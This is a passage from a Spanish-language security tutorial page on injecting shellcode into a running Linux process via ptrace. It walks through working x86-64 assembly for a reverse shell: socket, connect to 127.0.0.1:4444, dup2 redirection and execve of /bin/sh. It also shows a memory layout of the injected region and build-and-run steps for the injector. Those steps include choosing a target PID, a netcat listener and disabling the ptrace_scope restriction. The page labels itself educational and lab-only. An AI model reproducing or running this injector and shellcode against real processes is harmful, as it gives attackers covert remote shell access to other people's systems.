<p><strong>¿Por qué R11?</strong></p>
<p>R11 es un registro "clobbered" por las syscalls (el kernel lo usa para guardar RFLAGS). Por eso lo usamos inmediatamente después del fork, antes de cualquier otra syscall.</p>
<h4 id="setsid-nueva-sesion">setsid() - Nueva sesión<a class="headerlink" href="#setsid-nueva-sesion" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">112</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Por qué setsid?</strong></p>
<p><code>setsid()</code> crea una nueva sesión y hace que el proceso hijo sea el líder de esa sesión. Beneficios:</p>
<ul>
<li>Se desvincula de la terminal controladora original.</li>
<li>Señales como SIGHUP no lo afectarán cuando el padre termine.</li>
<li>La reverse shell será más estable y persistente.</li>
</ul>
<h4 id="socket-crear-socket-tcp">socket() - Crear socket TCP<a class="headerlink" href="#socket-crear-socket-tcp" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span><span class="w">          </span><span class="c1">; syscall: socket</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">           </span><span class="c1">; AF_INET (IPv4)</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w">           </span><span class="c1">; SOCK_STREAM (TCP)</span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">         </span><span class="c1">; protocol = 0 (default)</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w">          </span><span class="c1">; Guardar fd del socket</span>
</span></code></pre></div>
<p>Creamos un socket TCP/IPv4 y guardamos el file descriptor en R8.</p>
<h4 id="connect-conectar-al-atacante">connect() - Conectar al atacante<a class="headerlink" href="#connect-conectar-al-atacante" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="w">    </span><span class="c1">; Construir sockaddr_in en el stack</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="w"> </span><span class="nb">r9</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r9</span><span class="w">                      </span><span class="c1">; 8 bytes de padding</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0100007F5c110002</span><span class="w">  </span><span class="c1">; familia + puerto + IP</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span><span class="w">          </span><span class="c1">; syscall: connect</span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span><span class="w">          </span><span class="c1">; socket fd</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>Estructura sockaddr_in:</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>0x0100007F5c110002 en memoria (little-endian):
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>02 00 11 5c 7F 00 00 01
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>02 00       = AF_INET (familia = 2)
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>11 5c       = puerto 4444 (0x115C en network byte order)
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>7F 00 00 01 = 127.0.0.1
</span></code></pre></div>
<h4 id="dup2-redirigir-io">dup2() - Redirigir I/O<a class="headerlink" href="#dup2-redirigir-io" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="nl">.dup2:</span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span><span class="w">          </span><span class="c1">; socket fd</span>
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="w">    </span><span class="nf">inc</span><span class="w"> </span><span class="nb">rsi</span>
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span>
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="w">    </span><span class="nf">jl</span><span class="w"> </span><span class="nv">.dup2</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Redirige stdin (0), stdout (1) y stderr (2) al socket. Después de esto, todo lo que se lea/escriba irá por el socket hacia el atacante.</p>
<h4 id="execve-ejecutar-shell">execve() - Ejecutar shell<a class="headerlink" href="#execve-ejecutar-shell" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f6e69622f</span><span class="w">    </span><span class="c1">; &quot;/bin/sh&quot;</span>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">                 </span><span class="c1">; argv[0] = &quot;/bin/sh&quot;</span>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">                 </span><span class="c1">; argv = {NULL}</span>
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">                 </span><span class="c1">; envp = {NULL}</span>
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Ejecuta <code>/bin/sh</code>. Como stdin/stdout/stderr están redirigidos al socket, el atacante obtiene una shell interactiva.</p>
<hr />
<h2 id="diagrama-de-memoria-post-inyeccion">Diagrama de memoria post-inyección<a class="headerlink" href="#diagrama-de-memoria-post-inyeccion" title="Permanent link">&para;</a></h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>┌─────────────────────────────────────────────────────────────┐
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>│                    PROCESO VÍCTIMA                          │
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>├─────────────────────────────────────────────────────────────┤
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>│                                                             │
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>│  Código original del proceso                                │
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>│  ┌─────────────────────────────────────────────────────┐    │
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>│  │ ...                                                 │    │
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>│  │ [RIP original] → instrucción donde se detuvo        │◄───┤ Restaurado
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a>│  │ ...                                                 │    │
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>│  └─────────────────────────────────────────────────────┘    │
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>│                                                             │
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a>├─────────────────────────────────────────────────────────────┤
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>│                                                             │
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a>│  MMAP Region (4096 bytes, RWX)                              │
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a>│  ┌─────────────────────────────────────────────────────┐    │
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>│  │ +0x000: shellcode _start (fork)                     │◄───┤ Nuevo RIP
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a>│  │ +0x008: ...                                         │    │
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a>│  │ +0x010: código padre (jmp a retorno)                │    │
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a>│  │ +0x020: .child (setsid, socket, connect...)         │    │
</span><span id="__span-42-20"><a id="__codelineno-42-20" name="__codelineno-42-20" href="#__codelineno-42-20"></a>│  │ +0x080: .dup2 loop                                  │    │
</span><span id="__span-42-21"><a id="__codelineno-42-21" name="__codelineno-42-21" href="#__codelineno-42-21"></a>│  │ +0x0A0: execve(&quot;/bin/sh&quot;)                           │    │
</span><span id="__span-42-22"><a id="__codelineno-42-22" name="__codelineno-42-22" href="#__codelineno-42-22"></a>│  │ ...                                                 │    │
</span><span id="__span-42-23"><a id="__codelineno-42-23" name="__codelineno-42-23" href="#__codelineno-42-23"></a>│  │ +0xFF8: RIP de retorno original                     │◄───┤ Guardado aquí
</span><span id="__span-42-24"><a id="__codelineno-42-24" name="__codelineno-42-24" href="#__codelineno-42-24"></a>│  └─────────────────────────────────────────────────────┘    │
</span><span id="__span-42-25"><a id="__codelineno-42-25" name="__codelineno-42-25" href="#__codelineno-42-25"></a>│                                                             │
</span><span id="__span-42-26"><a id="__codelineno-42-26" name="__codelineno-42-26" href="#__codelineno-42-26"></a>└─────────────────────────────────────────────────────────────┘
</span></code></pre></div>
<hr />
<h2 id="compilacion-y-uso">Compilación y uso<a class="headerlink" href="#compilacion-y-uso" title="Permanent link">&para;</a></h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1"># Compilar el inyector</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj.asm<span class="w"> </span>-o<span class="w"> </span>proc_inj.o
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>ld<span class="w"> </span>proc_inj.o<span class="w"> </span>-o<span class="w"> </span>proc_inj
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="c1"># Compilar el shellcode (para testing independiente)</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>proc_inj_rev_tcp.asm<span class="w"> </span>-o<span class="w"> </span>shell.o
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>ld<span class="w"> </span>shell.o<span class="w"> </span>-o<span class="w"> </span>shell
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="c1"># Encontrar PID del proceso objetivo</span>
</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>&lt;nombre_proceso&gt;
</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>
</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a><span class="c1"># Modificar el PID en proc_inj.asm (línea: mov r15, &lt;PID&gt;)</span>
</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>
</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="c1"># Recompilar y ejecutar (requiere CAP_SYS_PTRACE o mismo UID)</span>
</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>./proc_inj
</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a>
</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a><span class="c1"># En otra terminal: listener para la reverse shell</span>
</span><span id="__span-43-18"><a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
</span></code></pre></div>
<hr />
<h2 id="consideraciones-de-seguridad">Consideraciones de seguridad<a class="headerlink" href="#consideraciones-de-seguridad" title="Permanent link">&para;</a></h2>
<h3 id="permisos-necesarios">Permisos necesarios<a class="headerlink" href="#permisos-necesarios" title="Permanent link">&para;</a></h3>
<p>Para que ptrace funcione, se debe cumplir al menos una de estas condiciones:</p>
<ol>
<li>El tracer tiene el mismo UID que el tracee.</li>
<li>El tracer tiene la capability <code>CAP_SYS_PTRACE</code>.</li>
<li>El tracer es root.</li>
</ol>
<h3 id="ptrace_scope-yama-lsm">ptrace_scope (Yama LSM)<a class="headerlink" href="#ptrace_scope-yama-lsm" title="Permanent link">&para;</a></h3>
<p>El archivo <code>/proc/sys/kernel/yama/ptrace_scope</code> controla restricciones adicionales:</p>
<table>
<thead>
<tr>
<th>Valor</th>
<th>Comportamiento</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Sin restricciones (cualquier proceso puede tracear a otro del mismo UID)</td>
</tr>
<tr>
<td>1</td>
<td>Solo procesos padres pueden tracear hijos (default en Ubuntu/Debian)</td>
</tr>
<tr>
<td>2</td>
<td>Solo procesos con CAP_SYS_PTRACE pueden tracear</td>
</tr>
<tr>
<td>3</td>
<td>Ptrace completamente deshabilitado</td>
</tr>
</tbody>
</table>
<p>Para testing, puedes temporalmente:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/proc/sys/kernel/yama/ptrace_scope
</span></code></pre></div>
<h3 id="sobre-orig_rax">Sobre orig_rax<a class="headerlink" href="#sobre-orig_rax" title="Permanent link">&para;</a></h3>
<p>Establecemos <code>orig_rax = -1</code> antes del DETACH. Si no lo hacemos y el proceso estaba en medio de una syscall interrumpible cuando lo adjuntamos, Linux podría intentar reiniciar esa syscall automáticamente, causando comportamiento inesperado.</p>
<hr />
<div class="admonition danger">
<p class="admonition-title">Solo en entornos controlados</p>
<p>Este código es para fines educativos y de investigación. Ejecutar únicamente en máquinas virtuales o entornos de laboratorio propios. El uso indebido de estas técnicas es ilegal.</p>
</div>
<hr />
<div class="admonition recursos">
<p class="admonition-title">Referencias</p>
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace(2) - Linux manual</a></li>
<li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Syscall Table x86-64</a></li>
<li><a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/user_64.h">user_regs_struct - Linux source</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html">Yama LSM - ptrace_scope</a></li>
</ul>
</div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Volver al principio
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      © 2026 0x574R
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>